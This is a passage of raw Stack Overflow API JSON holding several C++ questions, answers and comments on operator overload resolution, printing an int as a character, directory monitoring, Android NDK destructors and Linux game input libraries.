"https://stackoverflow.com/questions/29808850/in-operator-lookup-no-preference-is-given-to-members-over-nonmembers/29809096#29809096", "title": "In operator lookup no preference is given to members over nonmembers", "body": "<p>Your code only compiles because your operators are not equivalent in this context. One is better than the other, according to the rules of implicit conversion sequence ranking.</p>\n\n<p>Note that your member operator lacks const-qualification for its first (left) argument. It actually stands for <code>bool operator==(A&amp;, const A&amp;)</code>.</p>\n\n<p>Since your <code>a</code> and <code>b</code> in <code>main</code> are not declared as <code>const</code>, the implicit conversion sequence for the left-hand operand is <em>shorter</em> (better) for <em>member</em> operator. It does not require a qualification conversion of <code>a</code> from <code>A</code> to <code>const A</code>. This is what makes it a better candidate. This is why your member function version is selected.</p>\n\n<p>To make both versions equivalent you have to add <code>const</code> to your member operator declaration</p>\n\n<pre><code>class A\n{\npublic:\n    bool operator==(const A&amp;) const\n    {\n        return true;\n    }\n};\n</code></pre>\n\n<p>and that will immediately make your <code>a == b</code> comparison ambiguous.</p>\n"}], "owner": {"reputation": 359, "user_id": 1758528, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4025091af59120bc54eaebb8072d76ac?s=128&d=identicon&r=PG", "display_name": "Vahagn Babajanyan", "link": "https://stackoverflow.com/users/1758528/vahagn-babajanyan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "accepted_answer_id": 29809096, "answer_count": 1, "score": 1, "last_activity_date": 1429741561, "creation_date": 1429736846, "last_edit_date": 1429737301, "question_id": 29808850, "link": "https://stackoverflow.com/questions/29808850/in-operator-lookup-no-preference-is-given-to-members-over-nonmembers", "title": "In operator lookup no preference is given to members over nonmembers", "body": "<p>Stroustrup writes : </p>\n\n<p>Consider a binary operator @. If x is of type X and y is of type Y, x@y is resolved like this:</p>\n\n<p>\u2022 If X is a class, look for operator@ as a member of X or as a member of a base of X; and</p>\n\n<p>\u2022 look for declarations of operator@ in the context surrounding x@y; and</p>\n\n<p>\u2022 if X is defined in namespace N, look for declarations of operator@ in N; and</p>\n\n<p>\u2022 if Y is defined in namespace M, look for declarations of operator@ in M.</p>\n\n<p>Declarations for several operator@s may be found and overload resolution rules (\u00a712.3) are used to find the best match, if any. This lookup mechanism is applied only if the operator has at least one operand of a user-defined type. Therefore, user-defined conversions (\u00a718.3.2, \u00a718.4) will be considered.\nNote that a type alias is just a synonym and not a separate user-defined type (\u00a76.5).\nUnary operators are resolved analogously.</p>\n\n<p><strong>Note that in operator lookup no preference is given to members over nonmembers</strong>. This differs from lookup of named functions</p>\n\n<p>So what means the bold expression. If class has member and in the same time there is non-member function which could be used in the context, then no preference is given to member? For example</p>\n\n<pre><code>class A\n{\npublic:\n    bool operator==(const A&amp;)\n    {\n        return true;\n    }\n};\n\nbool operator==(const A&amp;, const A&amp;)\n{\n    return true;\n}\n\nint main()\n{\n    A a, b;\n    a == b;\n}\n</code></pre>\n\n<p>I think(and compilers agree with me :) ) that member function should be called, but as written above no preference should be given to member operator. So what exactly means Stroustrup by that sentence?</p>\n"}, {"tags": ["c++"], "comments": [{"owner": {"reputation": 39539, "user_id": 153430, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a446e1fd338fb334fa68b3f7470cd65b?s=128&d=identicon&r=PG", "display_name": "Jim Lewis", "link": "https://stackoverflow.com/users/153430/jim-lewis"}, "edited": false, "score": 5, "creation_date": 1429737051, "post_id": 29808838, "comment_id": 47745885, "body": "The problem is most likely in the output code that you haven&#39;t shown us.  Maybe you&#39;re trying to print an integer value using a string format?"}, {"owner": {"reputation": 31368, "user_id": 3133316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30f0b31e22bec21f12f31cd30ae5b148?s=128&d=identicon&r=PG&f=1", "display_name": "PaulMcKenzie", "link": "https://stackoverflow.com/users/3133316/paulmckenzie"}, "edited": false, "score": 2, "creation_date": 1429737052, "post_id": 29808838, "comment_id": 47745889, "body": "How about showing us the code that outputs the text."}, {"owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "edited": false, "score": 2, "creation_date": 1429737064, "post_id": 29808838, "comment_id": 47745894, "body": "You probably display a <code>char</code> initialized with the value of <code>int</code>. Post the displaying code. Unrelated: use <a href=\"http://en.cppreference.com/w/cpp/container/vector/emplace_back\" rel=\"nofollow noreferrer\"><code>std::vector::emplace_back()</code></a> instead of pushing temporaries in the vector."}, {"owner": {"reputation": 269328, "user_id": 5987, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/2a1f9f4986b58015691eb2014e78869f?s=128&d=identicon&r=PG", "display_name": "Mark Ransom", "link": "https://stackoverflow.com/users/5987/mark-ransom"}, "edited": false, "score": 1, "creation_date": 1429737145, "post_id": 29808838, "comment_id": 47745955, "body": "The problem is in the <code>president</code> class, you&#39;ve probably used <code>int8_t</code> or <code>char</code> instead of <code>int</code> for the president&#39;s number."}, {"owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "reply_to_user": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "edited": false, "score": 0, "creation_date": 1429737318, "post_id": 29808838, "comment_id": 47746053, "body": "@vsoftco Or simply call <code>presidents.push_back(president(...))</code>, which will call <code>push_back(president&amp;&amp;)</code>, that will be as fast as <code>emplace_back()</code> if proper move constructor is defined. But I think that&#39;s a matter of taste."}, {"owner": {"reputation": 17210, "user_id": 2436175, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/CK0Zo.png?s=128&g=1", "display_name": "Antonio", "link": "https://stackoverflow.com/users/2436175/antonio"}, "edited": false, "score": 0, "creation_date": 1429739836, "post_id": 29808838, "comment_id": 47747317, "body": "You shouldn&#39;t post a question and run away without reacting to the feedback..."}, {"owner": {"reputation": 194, "user_id": 4229080, "user_type": "registered", "profile_image": "https://graph.facebook.com/1697264739/picture?type=large", "display_name": "Ben Buurstra", "link": "https://stackoverflow.com/users/4229080/ben-buurstra"}, "reply_to_user": {"reputation": 17210, "user_id": 2436175, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/CK0Zo.png?s=128&g=1", "display_name": "Antonio", "link": "https://stackoverflow.com/users/2436175/antonio"}, "edited": false, "score": 0, "creation_date": 1439612706, "post_id": 29808838, "comment_id": 51945114, "body": "@Antonio, I accepted the answer that worked. How is that not feedback? Plus, I wasn&#39;t watching it very closely since I posted this before going into a class. I wasn&#39;t able to post feedback 50 minutes after posting it."}], "answers": [{"comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 56117, "user_id": 845092, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/50ccdbac5f0f9ff683e4b30a248189bf?s=128&d=identicon&r=PG", "display_name": "Mooing Duck", "link": "https://stackoverflow.com/users/845092/mooing-duck"}, "edited": false, "score": 0, "creation_date": 1429740827, "post_id": 29809515, "comment_id": 47747785, "body": "@MooingDuck he&#39;s got you there"}, {"owner": {"reputation": 56117, "user_id": 845092, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/50ccdbac5f0f9ff683e4b30a248189bf?s=128&d=identicon&r=PG", "display_name": "Mooing Duck", "link": "https://stackoverflow.com/users/845092/mooing-duck"}, "edited": false, "score": 0, "creation_date": 1429740888, "post_id": 29809515, "comment_id": 47747806, "body": "Huh.  Well.  Things Known +1."}], "tags": [], "owner": {"reputation": 1798, "user_id": 3422444, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4413831d1eb45657c1c47d9e86cbdac4?s=128&d=identicon&r=PG", "display_name": "Bryan Way", "link": "https://stackoverflow.com/users/3422444/bryan-way"}, "is_accepted": true, "score": 2, "last_activity_date": 1429744198, "last_edit_date": 1429744198, "creation_date": 1429739344, "answer_id": 29809515, "question_id": 29808838, "link": "https://stackoverflow.com/questions/29808838/alt-code-being-returned-instead-of-int-c/29809515#29809515", "title": "Alt code being returned instead of int C++", "body": "<p>Without seeing the outputting code, there are a number of reasons why this could happen. But most likely, you have something like this going on:</p>\n\n<pre><code>string outputBuffer = presidentName;\noutputBuffer += \" was the \";\noutputBuffer += presidentNumber; // The problem is here.\noutputBuffer += getSuffix(presidentNumber); // Or whatever logic you have for this\noutputBuffer += \" President\";\n</code></pre>\n\n<p>The fix is simple:</p>\n\n<pre><code>outputBuffer = to_string(presidentNumber); // Replace the problem line with this\n</code></pre>\n\n<p>C++ is pretty good with type detection, but it's still a strong type language. The compiler interprets <code>presidentNumber</code> as a literal character and without error (although depending on your compiler and flags you may get a warning).</p>\n\n<p>So if <code>presidentNumber = 65</code>, that represents an \"A\" character. (Never mind the fact that there's not a 65th president, just an example).</p>\n\n<p><strong>Examples</strong></p>\n\n<p>Before: <a href=\"http://cpp.sh/2tjj\" rel=\"nofollow\">http://cpp.sh/2tjj</a></p>\n\n<p>After: <a href=\"http://cpp.sh/8izy\" rel=\"nofollow\">http://cpp.sh/8izy</a></p>\n"}], "owner": {"reputation": 194, "user_id": 4229080, "user_type": "registered", "profile_image": "https://graph.facebook.com/1697264739/picture?type=large", "display_name": "Ben Buurstra", "link": "https://stackoverflow.com/users/4229080/ben-buurstra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 217, "favorite_count": 0, "accepted_answer_id": 29809515, "answer_count": 1, "score": 0, "last_activity_date": 1429744198, "creation_date": 1429736796, "question_id": 29808838, "link": "https://stackoverflow.com/questions/29808838/alt-code-being-returned-instead-of-int-c", "title": "Alt code being returned instead of int C++", "body": "<p>I'm currently working on a project for a C++ class, and the assignment is as follows. <strong>Create a program that reads a file of presidents, and ask the user to guess the correct value for the selected president.</strong>\nWe were given a .txt file that has all the data, and is in the file like so.</p>\n\n<pre><code>1\nGeorge Washington\n(1732 to 1799)\nApril 30, 1789\nMarch 4, 1797\nIndependent\nCommander-in-Chief; of the Continental Army (1775 to 1783)\nJohn Adams                          \n2\nJohn Adams\n(1735 to 1826)\nMarch 4, 1797\nMarch 4, 1801\nFederalist\nVice President\nThomas Jefferson\n</code></pre>\n\n<p>The top number being the president number, 2nd being their name, 3rd being their birthdate and death date, 4th being the day they took office, 5th being when they left office, 6th being party, 7th being previous office held, and 7th being their vice president. Here's the code for the method that reads the file.</p>\n\n<pre><code>void presidentGame::readPresidents(){\n\n        string fileName = \"presidents.txt\";\n        string strNum, name, birthDeath, tookOffice, leaveOffice, party, previousOffice, vicePresident;\n        int num;\n        ifstream inFile(fileName);\n        if (! inFile) {\n            cout &lt;&lt; \"Failed to find the file \" &lt;&lt; fileName  &lt;&lt; endl;\n        }\n        else {\n            while (getline(inFile, strNum)){\n                num = stoi(strNum);  //I did this because an actual int is better than a string\n                getline(inFile, name);\n                getline(inFile, birthDeath);\n                getline(inFile, tookOffice);\n                getline(inFile, leaveOffice);\n                getline(inFile, party);\n                getline(inFile, previousOffice);\n                getline(inFile, vicePresident);\n                president tempPresident(num, name, birthDeath,tookOffice, leaveOffice, party, previousOffice, vicePresident);\n                presidents.push_back(tempPresident);\n            }\n        }\n}\n</code></pre>\n\n<p>The problem that is occurring, is that num, is being displayed as an Alt code value in command prompt. Here's an example of the output when you answer correctly. </p>\n\n<pre><code>***********************************************\nCorrect Incorrect       Total Guesses\n======= =========       =============\n0          11                 11\nGuess which President Thomas Jefferson was? &lt;\u2665&gt; 3\n\nCongrats, You finally got one right!\n\nThomas Jefferson was the \u2665rd President\n\nPresident Information:\n============================\nHe lived from (1743 to 1826)\nHe took office March 4, 1801\nHe left office on March 4, 1809\nHis party was Democratic-Republican\nHis previous office held was Vice PresidentHis vice president was 1st term: Aaro\nn Burr / 2nd term: George Clinton\nPress any key to continue...\n</code></pre>\n\n<p>So instead of displaying the number as \"3\", it displayed it at alt+NUM_3, which is \u2665. Any help is appreciated. </p>\n"}, {"tags": ["c++", "image", "image-processing", "imread"], "comments": [{"owner": {"reputation": 154, "user_id": 4246048, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d2ff80c6f69f70e9a71e9b25d8d9de78?s=128&d=identicon&r=PG&f=1", "display_name": "newbie", "link": "https://stackoverflow.com/users/4246048/newbie"}, "edited": false, "score": 3, "creation_date": 1429737039, "post_id": 29808734, "comment_id": 47745882, "body": "Can you show us what you have tried?"}, {"owner": {"reputation": 3, "user_id": 4821405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/869444510afd6d4eb4db10ef8bc74160?s=128&d=identicon&r=PG&f=1", "display_name": "erhertan", "link": "https://stackoverflow.com/users/4821405/erhertan"}, "reply_to_user": {"reputation": 154, "user_id": 4246048, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d2ff80c6f69f70e9a71e9b25d8d9de78?s=128&d=identicon&r=PG&f=1", "display_name": "newbie", "link": "https://stackoverflow.com/users/4246048/newbie"}, "edited": false, "score": 0, "creation_date": 1429739244, "post_id": 29808734, "comment_id": 47747054, "body": "I am processing the image by using the code as follow: frame = cvLoadImage(&quot;test17.bmp&quot;,CV_LOAD_IMAGE_GRAYSCALE);  However; I do not want to read image by typing its name. I want to monitor a directory and when an image is added to the directory, I want to read this image. Does it help you to understand what I tried to do?"}, {"owner": {"reputation": 154, "user_id": 4246048, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d2ff80c6f69f70e9a71e9b25d8d9de78?s=128&d=identicon&r=PG&f=1", "display_name": "newbie", "link": "https://stackoverflow.com/users/4246048/newbie"}, "edited": false, "score": 0, "creation_date": 1429739640, "post_id": 29808734, "comment_id": 47747219, "body": "I think it is probably duplicated with this question: <a href=\"http://stackoverflow.com/questions/61253/how-to-be-notified-of-file-directory-change-in-c-c-ideally-using-posix\" title=\"how to be notified of file directory change in c c ideally using posix\">stackoverflow.com/questions/61253/&hellip;</a>  and this question: <a href=\"http://stackoverflow.com/questions/931093/how-do-i-make-my-program-watch-for-file-modification-in-c\" title=\"how do i make my program watch for file modification in c\">stackoverflow.com/questions/931093/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 9996, "user_id": 2360695, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/542ff60c0222369f65f9af25daacc03d?s=128&d=identicon&r=PG", "display_name": "ScottMcP-MVP", "link": "https://stackoverflow.com/users/2360695/scottmcp-mvp"}, "is_accepted": false, "score": 1, "last_activity_date": 1429737123, "creation_date": 1429737123, "answer_id": 29808949, "question_id": 29808734, "link": "https://stackoverflow.com/questions/29808734/how-to-monitor-a-directory-and-read-image-in-this-directory-in-c/29808949#29808949", "title": "How to monitor a directory and read image in this directory in C++", "body": "<p>The Windows ReadDirectoryChangesW API can be used to monitor a directory for added files. However, it is very advanced and if you are new to C++ and Windows programming it is probably beyond what you can achieve. You will need some experienced help.</p>\n"}, {"tags": [], "owner": {"reputation": 58, "user_id": 4834760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5558d24abf45ea191837b3fad8f4b0e?s=128&d=identicon&r=PG&f=1", "display_name": "Elektrik Adam", "link": "https://stackoverflow.com/users/4834760/elektrik-adam"}, "is_accepted": true, "score": 0, "last_activity_date": 1430123282, "last_edit_date": 1430123282, "creation_date": 1430121427, "answer_id": 29890164, "question_id": 29808734, "link": "https://stackoverflow.com/questions/29808734/how-to-monitor-a-directory-and-read-image-in-this-directory-in-c/29890164#29890164", "title": "How to monitor a directory and read image in this directory in C++", "body": "<p>I dont agree with the other guy who answered the question, it can be done eaisly with some co-existing libraries that I used below, This code does what you are looking for, </p>\n\n<pre><code>string processName()\n{\n\n   FILETIME bestDate = { 0, 0 };\n   FILETIME curDate;\n   string name;\n   CFileFind finder;\n\n\n   BOOL bWorking = finder.FindFile(\"*.png\");\n\n   while (bWorking)\n   {\n\n      bWorking = finder.FindNextFile();\n\n     // date = (((ULONGLONG) finder.GetCreationTime(ft).dwHighDateTime) &lt;&lt; 32) + finder.GetCreationTime(ft).dwLowDateTime;\n\n      finder.GetCreationTime(&amp;curDate);\n\n      if (CompareFileTime(&amp;curDate, &amp;bestDate) &gt; 0 )\n      {\n          bestDate = curDate;\n          name = finder.GetFileName().GetString();\n          // name = (LPCTSTR) finder.GetFileName();\n      }\n\n\n\n   }\n   return name;\n}\n</code></pre>\n\n<p>Here I wrote it for the code you, it takes the name of the last entered /.png extension you can check libray for it.</p>\n\n<p>Please tell me for further question</p>\n"}], "owner": {"reputation": 3, "user_id": 4821405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/869444510afd6d4eb4db10ef8bc74160?s=128&d=identicon&r=PG&f=1", "display_name": "erhertan", "link": "https://stackoverflow.com/users/4821405/erhertan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 29890164, "answer_count": 2, "score": 0, "last_activity_date": 1430123282, "creation_date": 1429736486, "last_edit_date": 1429739259, "question_id": 29808734, "link": "https://stackoverflow.com/questions/29808734/how-to-monitor-a-directory-and-read-image-in-this-directory-in-c", "title": "How to monitor a directory and read image in this directory in C++", "body": "<p>First of all, I am new to C++. I am using Visual Studio 2010. I worked on a project that includes an camera. Camera send an image(bitmap) to a specific folder location in my computer. I want to monitor the directory consistenly. When a new bitmap image is obtained in the directory, I want to process this image. The code that I want to use is always monitoring the directory and read the last bitmap image in this directory. What can I use to achieve it? What is your suggestions? Could you write the source code? Thanks for your interest.</p>\n"}, {"tags": ["android", "c++", "static", "android-ndk"], "comments": [{"owner": {"reputation": 77347, "user_id": 1631193, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c713494416ceac454d71c524e15f1c6?s=128&d=identicon&r=PG&f=1", "display_name": "Gabe Sechan", "link": "https://stackoverflow.com/users/1631193/gabe-sechan"}, "edited": false, "score": 2, "creation_date": 1429736748, "post_id": 29808727, "comment_id": 47745739, "body": "What do you mean it doesn&#39;t unload a .so after closing the application.  Do you mean after finishing the activity?  It shouldn&#39;t-  if you need that, put a JNI call to deallocate any variables and call it in onDestroy or in finish.  If you mean it doesn&#39;t unload and reload after actually ending the process-  you&#39;re wrong."}, {"owner": {"reputation": 758, "user_id": 4682108, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/fbfd118fa3c93d2e35c18c916bd61f06?s=128&d=identicon&r=PG&f=1", "display_name": "Vorotnyak_Nazar", "link": "https://stackoverflow.com/users/4682108/vorotnyak-nazar"}, "reply_to_user": {"reputation": 77347, "user_id": 1631193, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c713494416ceac454d71c524e15f1c6?s=128&d=identicon&r=PG&f=1", "display_name": "Gabe Sechan", "link": "https://stackoverflow.com/users/1631193/gabe-sechan"}, "edited": false, "score": 0, "creation_date": 1429767732, "post_id": 29808727, "comment_id": 47756627, "body": "Yes, I mean after finishing the activity. I wanna dealocate not variables, but singleton and therefore i need android calls the destructor of static variable aftef finishing activity."}, {"owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "edited": false, "score": 0, "creation_date": 1429775998, "post_id": 29808727, "comment_id": 47761330, "body": "Then don&#39;t kill or exit the process - that bulk de-allocates everything in the kernel.  If you really want to dispose of your singleton, remove all references then garbage collect it or invoke its destructor, as appropriate to its nature."}], "answers": [{"comments": [{"owner": {"reputation": 758, "user_id": 4682108, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/fbfd118fa3c93d2e35c18c916bd61f06?s=128&d=identicon&r=PG&f=1", "display_name": "Vorotnyak_Nazar", "link": "https://stackoverflow.com/users/4682108/vorotnyak-nazar"}, "edited": false, "score": 0, "creation_date": 1429767316, "post_id": 29808833, "comment_id": 47756452, "body": "How can I create a singleton then?"}, {"owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "reply_to_user": {"reputation": 758, "user_id": 4682108, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/fbfd118fa3c93d2e35c18c916bd61f06?s=128&d=identicon&r=PG&f=1", "display_name": "Vorotnyak_Nazar", "link": "https://stackoverflow.com/users/4682108/vorotnyak-nazar"}, "edited": false, "score": 0, "creation_date": 1429775847, "post_id": 29808833, "comment_id": 47761237, "body": "In the usual way - create a global static object only if it does not already exist.  That has nothing to do with this, and if truly unfamiliar belongs in its own question - though one that probably already has duplicates here."}], "tags": [], "owner": {"reputation": 38430, "user_id": 429063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3fd38783123814dee889d28c991e56fb?s=128&d=identicon&r=PG", "display_name": "Chris Stratton", "link": "https://stackoverflow.com/users/429063/chris-stratton"}, "is_accepted": true, "score": 2, "last_activity_date": 1429736782, "creation_date": 1429736782, "answer_id": 29808833, "question_id": 29808727, "link": "https://stackoverflow.com/questions/29808727/android-ndk-how-to-log-calling-destructor-of-global-variable/29808833#29808833", "title": "Android. NDK. How to log calling destructor of global variable?", "body": "<p>This is not only pointless, but quite possibly counterproductive.  If android wants the memory utilized by your process, it will terminate the process to reclaim it; if it doesn't, it won't.  </p>\n\n<p>To specifically address your question, killing or exiting a process <strong>does not invoke destructors</strong>, it merely terminates execution and the kernel bulk-releases all memory and (conventional) resources.</p>\n\n<p>Do not try to second guess the system, as that can frequently result in killing a process only to have android immediately restart it.  Further, it can allegedly cause problems with a few Android IPC resources (like the camera) which may not be freed up when the process of a utilizing application unexpectedly dies.</p>\n"}], "owner": {"reputation": 758, "user_id": 4682108, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/fbfd118fa3c93d2e35c18c916bd61f06?s=128&d=identicon&r=PG&f=1", "display_name": "Vorotnyak_Nazar", "link": "https://stackoverflow.com/users/4682108/vorotnyak-nazar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 589, "favorite_count": 0, "accepted_answer_id": 29808833, "answer_count": 1, "score": -2, "last_activity_date": 1429736782, "creation_date": 1429736474, "question_id": 29808727, "link": "https://stackoverflow.com/questions/29808727/android-ndk-how-to-log-calling-destructor-of-global-variable", "title": "Android. NDK. How to log calling destructor of global variable?", "body": "<p>As we all know android doesn't unload *.so after close application. I had found the solve by adding \"exit(0)\" at the end, that is solved problem, but I wanna know exactly that all are OK.</p>\n\n<p>The code is work fine as expected after solving the problem:</p>\n\n<pre><code>static int value = 0;\n\n// In android_main\nLOGI(\"value = %d\", value); // always print 0, but not 1 after second run of\n// application as it was without \"exit(0)\" at the end\nvalue = 1;\n</code></pre>\n\n<p>I wanna to test that on class like:</p>\n\n<pre><code>class A {\n  A() {\n    LOGI(\"Constructor\");\n  }\n  ~A() {\n    LOGI(\"Destructor\");\n  }\n\nstatis A a;\n</code></pre>\n\n<p>In such way prints only \"Constructor\".\nMaybe because of destructor is calling after when LOGI isn't working more for application that will be closed ?\nQuestion: why LOGI in destructor isn't working? According to first example on top destructor is calling really.</p>\n"}, {"tags": ["c++", "linux", "input"], "comments": [{"owner": {"reputation": 2555, "user_id": 2467597, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YS49C.jpg?s=128&g=1", "display_name": "Ace Caserya", "link": "https://stackoverflow.com/users/2467597/ace-caserya"}, "edited": false, "score": 0, "creation_date": 1429736664, "post_id": 29808640, "comment_id": 47745695, "body": "Please do not put out of scope cause game-dev SE pointed me to stackoverflow"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 2, "creation_date": 1429737255, "post_id": 29808640, "comment_id": 47746011, "body": "Well, it <i>is</i> off topic. I guess people over at gamedev.se were misinformed. OT : I recommend <a href=\"http://libsdl.org/\" rel=\"nofollow noreferrer\">SDL2</a>."}, {"owner": {"reputation": 2555, "user_id": 2467597, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YS49C.jpg?s=128&g=1", "display_name": "Ace Caserya", "link": "https://stackoverflow.com/users/2467597/ace-caserya"}, "reply_to_user": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 0, "creation_date": 1429737408, "post_id": 29808640, "comment_id": 47746112, "body": "Honesty they wanna deal more on unity and controlled engines."}], "answers": [{"tags": [], "owner": {"reputation": 462, "user_id": 3113508, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b8950f1d046593f6cbd9bca76961583f?s=128&d=identicon&r=PG", "display_name": "Scott M", "link": "https://stackoverflow.com/users/3113508/scott-m"}, "is_accepted": true, "score": 1, "last_activity_date": 1429736966, "creation_date": 1429736966, "answer_id": 29808890, "question_id": 29808640, "link": "https://stackoverflow.com/questions/29808640/is-there-any-standard-linux-c-input-libraries-out-and-used/29808890#29808890", "title": "Is there any standard Linux C++ input libraries out and used?", "body": "<p>I am not sure what your requirements are, but the SFML libraries are cross-platform and allow you to view the state of the input devices without blocking.</p>\n\n<p>Home page: <a href=\"http://www.sfml-dev.org/index.php\" rel=\"nofollow\">http://www.sfml-dev.org/index.php</a></p>\n\n<p>Tutorials page: <a href=\"http://www.sfml-dev.org/tutorials/2.2/\" rel=\"nofollow\">http://www.sfml-dev.org/tutorials/2.2/</a></p>\n\n<p>Input tutorial: <a href=\"http://www.sfml-dev.org/tutorials/2.2/window-inputs.php\" rel=\"nofollow\">http://www.sfml-dev.org/tutorials/2.2/window-inputs.php</a></p>\n"}], "owner": {"reputation": 2555, "user_id": 2467597, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YS49C.jpg?s=128&g=1", "display_name": "Ace Caserya", "link": "https://stackoverflow.com/users/2467597/ace-caserya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 475, "favorite_count": 0, "closed_date": 1429741686, "accepted_answer_id": 29808890, "answer_count": 1, "score": -1, "last_activity_date": 1429742977, "creation_date": 1429736166, "last_edit_date": 1495540452, "question_id": 29808640, "link": "https://stackoverflow.com/questions/29808640/is-there-any-standard-linux-c-input-libraries-out-and-used", "closed_reason": "Not suitable for this site", "title": "Is there any standard Linux C++ input libraries out and used?", "body": "<p>Aspiring gamedev using Linux C++ g++-4.7</p>\n\n<p>I've done my research on time steps, game loops and do not user getch, focus on loop more than input cause its important etc... </p>\n\n<p>They say little about the workings of Input(), Movement(), ProcessInput() which are the same egg in which I actually need.</p>\n\n<p>I have no plans in shelling out or anything that might deal damage. I do program my own game loop.</p>\n\n<p>They convinced me it's simple but what libraries do I use to get proper inputs for my game loop if it would come from keyboard and mouse?</p>\n\n<p>Please do not post windows answers.</p>\n\n<p>I already read this:</p>\n\n<p><a href=\"https://gamedev.stackexchange.com/questions/651/tips-for-writing-the-main-game-loop\">https://gamedev.stackexchange.com/questions/651/tips-for-writing-the-main-game-loop</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/21257544/c-wait-for-user-input\">C++ wait for user input</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/421860/capture-characters-from-standard-input-without-waiting-for-enter-to-be-pressed\">Capture characters from standard input without waiting for enter to be pressed</a></p>\n"}, {"tags": ["c++", "gcc", "clang", "travis-ci", "biicode"], "answers": [{"comments": [{"owner": {"reputation": 1257, "user_id": 649140, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/ff4ce275d6b5e7986cc235e90c90a07b?s=128&d=identicon&r=PG", "display_name": "Sam Kellett", "link": "https://stackoverflow.com/users/649140/sam-kellett"}, "edited": false, "score": 0, "creation_date": 1429914762, "post_id": 29810561, "comment_id": 47843106, "body": "thanks for the scripts. they look like the way to go!"}], "tags": [], "owner": {"reputation": 3796, "user_id": 3215383, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yAGNQ.jpg?s=128&g=1", "display_name": "drodri", "link": "https://stackoverflow.com/users/3215383/drodri"}, "is_accepted": true, "score": 2, "last_activity_date": 1429744050, "creation_date": 1429744050, "answer_id": 29810561, "question_id": 29808610, "link": 